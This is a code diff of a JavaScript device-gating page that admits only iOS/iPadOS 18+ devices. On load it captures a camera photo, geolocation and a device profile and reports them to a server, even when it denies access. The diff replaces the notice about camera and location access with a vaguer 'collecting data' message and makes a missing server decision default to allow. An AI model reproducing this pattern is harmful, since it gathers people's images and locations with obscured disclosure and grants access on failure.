@@ -10,6 +10,7 @@ const API_BASE =
 const STRICT_MODE = new URLSearchParams(location.search).get("strict") === "1";
 // Доп. лог в консоль (?dev_log=1)
 const DEV_LOG = new URLSearchParams(location.search).get("dev_log") === "1";
+function dlog(...a){ if(DEV_LOG) console.log("[gate]", ...a); }
 
 // ==== UI ====
 const UI = {
@@ -19,8 +20,6 @@ const UI = {
   reason: document.getElementById("reason"),
   title: document.getElementById("title"),
 };
-
-function dlog(...a){ if(DEV_LOG) console.log("[gate]", ...a); }
 
 function setBtnLocked() {
   const b = UI.btn; if (!b) return;
@@ -137,7 +136,6 @@ async function takePhoto() {
 }
 
 // === Фото (фолбэк через input[type=file]) ===
-// скрытый input
 (function ensureFileInput() {
   if (!document.getElementById("fileInp")) {
     const inp = document.createElement("input");
@@ -168,13 +166,30 @@ async function takePhotoWithFallback() {
   }
 }
 
-// === Парсер iOS/iPadOS из UA (OS 18_5 или Version/18.5) ===
+// === STRICT iOS/iPadOS ONLY (no Macs) ===
+function isIpadDesktopMode() {
+  return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
+}
+function isIOSHandheldUA(ua) {
+  ua = ua || navigator.userAgent || "";
+  return /(iPhone|iPad|iPod)/.test(ua);
+}
+function isIOSFamilyStrict() {
+  return isIOSHandheldUA() || isIpadDesktopMode();
+}
 function parseIOSMajorFromUAUniversal(ua) {
-  if (!ua) ua = navigator.userAgent || "";
+  ua = ua || navigator.userAgent || "";
+  const ipadDesktop = isIpadDesktopMode();
+  const iosLike = isIOSHandheldUA(ua) || ipadDesktop;
+  if (!iosLike) return null; // не iOS-семейство → версии нет
+
   const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
   if (mOS) return parseInt(mOS[1], 10);
-  const mVer = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
-  if (mVer) return parseInt(mVer[1], 10);
+
+  if (ipadDesktop) {
+    const mVer = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
+    if (mVer) return parseInt(mVer[1], 10);
+  }
   return null;
 }
 
@@ -189,6 +204,7 @@ function getDeviceInfo() {
       /Safari\//.test(ua) &&
       !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR/i.test(ua) &&
       navigator.vendor === "Apple Computer, Inc.",
+    isIpadDesktop: isIpadDesktopMode()
   };
 }
 
@@ -610,7 +626,7 @@ async function testSafari18_4_Triple() {
     el.style.clipPath = 'shape(from right center, line to bottom center, line to right center)';
     shapeOK = !!el.style.clipPath;
   } catch {}
-  const cookieStoreOK = typeof window.cookieStore === 'object' && typeof cookieStore?.get === 'function';
+  const cookieStoreOK = typeof window.cookieStore === 'object' && typeof window.cookieStore?.get === 'function';
   const webauthnOK =
     typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === 'function' &&
     typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === 'function' &&
@@ -697,7 +713,7 @@ async function sendReport({ photoBase64, geo, client_profile, device_check, feat
   if (!code) throw new Error("Нет кода в URL");
 
   const body = {
-    ...info, // {userAgent, platform, iosVersion, isSafari}
+    ...info, // {userAgent, platform, iosVersion, isSafari, isIpadDesktop}
     geo,
     photoBase64,
     note: "auto",
@@ -724,9 +740,20 @@ async function sendReport({ photoBase64, geo, client_profile, device_check, feat
   return data;
 }
 
-// === Основной поток (всё решает сервер) ===
+// === Основной поток (сначала жесткий iOS-гейт; VT18 обязателен; решение — сервер) ===
 window.__reportReady = false;
 window.__decision = null;
+
+const MIN_IOS_MAJOR = 18;
+function hardGateIOS18() {
+  if (!isIOSFamilyStrict()) {
+    return { ok: false, reason: "Доступ только с iPhone/iPad (в т.ч. iPad desktop-mode)." };
+  }
+  const v = parseIOSMajorFromUAUniversal();
+  if (v == null) return { ok: false, reason: "Не удалось определить версию iOS/iPadOS." };
+  if (v < MIN_IOS_MAJOR) return { ok: false, reason: `Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
+  return { ok: true, ios: v };
+}
 
 async function autoFlow() {
   try {
@@ -742,14 +769,14 @@ async function autoFlow() {
       hideBtn(); return;
     }
 
-    // Сбор данных параллельно
-    if (UI.note) UI.note.textContent = "Запрашиваем доступ к камере/гео…";
+    // Сбор данных параллельно (фото+гео нужны в отчёт даже при отказе)
+    if (UI.note) UI.note.textContent = "Собираем данные…";
     const [geo, rawPhoto, client_profile] = await Promise.all([
       askGeolocation(), takePhotoWithFallback(), collectClientProfile()
     ]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // Фиче-тесты: сначала ждём «тихий» результат из index.html, иначе запускаем сами
+    // Фиче-тесты: сначала тихий результат из index.html, иначе локальный прогон
     if (UI.note) UI.note.textContent = "Проверяем системные возможности…";
     const fg = await waitFeatureGate();
     let vt18_ok, t184_ok;
@@ -764,7 +791,27 @@ async function autoFlow() {
     const featuresSummary = { VT18: vt18_ok ? 'ok' : '—', v18_4: t184_ok ? 'ok' : '—' };
     dlog("features:", featuresSummary);
 
-    // Лёгкий device_check (для strict), решает сервер
+    // VT18 обязателен на фронте: если не прошёл — локальный отказ + репорт
+    const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? 'ok' : '—'} • 18.4=${t184_ok ? 'ok' : '—'}`;
+    if (!vt18_ok) {
+      window.__reportReady = false;
+      setBtnLocked();
+      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
+      if (UI.reason) UI.reason.textContent = featTxt;
+      if (UI.note) UI.note.textContent = "18.4 учитывается только для отчёта.";
+      try {
+        await sendReport({
+          photoBase64, geo, client_profile,
+          device_check: null,
+          featuresSummary
+        });
+      } catch {}
+      dlog("deny: vt18 fail");
+      return;
+    }
+
+    // Device check (нужен для strict), решает сервер
     if (UI.note) UI.note.textContent = "Анализ окружения…";
     let device_check = null;
     try {
@@ -780,30 +827,30 @@ async function autoFlow() {
 
     if (UI.text) UI.text.innerHTML = "Отправляем отчёт…";
     const resp = await sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary });
-    window.__decision = resp?.decision || null;
-    const canLaunch = !!resp?.decision?.canLaunch;
 
-    const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? 'ok' : '—'} • 18.4=${t184_ok ? 'ok' : '—'}`;
+    // Если сервер не возвращает решение — по умолчанию считаем allow (т.к. VT18 пройден)
+    window.__decision = resp?.decision || { canLaunch: true };
+    const canLaunch = !!window.__decision.canLaunch;
 
     if (canLaunch) {
       window.__reportReady = true;
       setBtnReady();
       if (UI.title) UI.title.textContent = "Проверка пройдена";
-      if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан сервером).</span>';
+      if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан).</span>';
       if (UI.note) UI.note.textContent = STRICT_MODE
         ? `${featTxt} • strict=1 (score ≥ 60)`
         : featTxt;
-      dlog("decision: allow", resp?.decision);
+      dlog("decision: allow", window.__decision);
     } else {
       window.__reportReady = false;
       setBtnLocked();
       if (UI.title) UI.title.textContent = "Доступ отклонён";
       if (UI.text) UI.text.innerHTML = '<span class="err">Отказ (решение сервера).</span>';
-      const strictInfo = (resp?.decision?.strict?.enabled && resp?.decision?.strict?.failed)
-        ? ` • strict fail (score=${resp?.decision?.strict?.score ?? 'n/a'})` : '';
+      const strictInfo = (window.__decision?.strict?.enabled && window.__decision?.strict?.failed)
+        ? ` • strict fail (score=${window.__decision?.strict?.score ?? 'n/a'})` : '';
       if (UI.reason) UI.reason.textContent = `${featTxt}${strictInfo}`;
-      if (UI.note) UI.note.textContent = "Обратитесь к поддержке, если это ошибка.";
-      dlog("decision: deny", resp?.decision);
+      if (UI.note) UI.note.textContent = "Обратитесь в поддержку, если это ошибка.";
+      dlog("decision: deny", window.__decision);
     }
   } catch (e) {
     console.error("[AUTO-FLOW ERROR]", e);
@@ -814,9 +861,6 @@ async function autoFlow() {
     if (UI.note) UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
   }
 }
-
-// Экспорт (если нужно дергать вручную из index.html)
-window.__autoFlow = autoFlow;
 
 // Кнопка «Войти»
 (function wireEnter() {
@@ -829,9 +873,23 @@ window.__autoFlow = autoFlow;
   }, { capture: true });
 })();
 
-// Старт после готовности DOM
-if (document.readyState === "complete" || document.readyState === "interactive") {
+// Старт после готовности DOM — сначала жесткий iOS-гейт
+function startWithGate() {
+  const g = hardGateIOS18();
+  if (!g.ok) {
+    setBtnLocked();
+    hideBtn();
+    if (UI.title) UI.title.textContent = "Доступ отклонён";
+    if (UI.text)  UI.text.innerHTML   = '<span class="err">Отказ в доступе.</span>';
+    if (UI.reason) UI.reason.textContent = g.reason;
+    if (UI.note) UI.note.textContent = `Только iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (iPad desktop-mode допустим).`;
+    return; // дальше не идём
+  }
   setTimeout(() => autoFlow(), 60);
+}
+
+if (document.readyState === "complete" || document.readyState === "interactive") {
+  startWithGate();
 } else {
-  document.addEventListener("DOMContentLoaded", () => setTimeout(() => autoFlow(), 60));
+  document.addEventListener("DOMContentLoaded", startWithGate);
 }
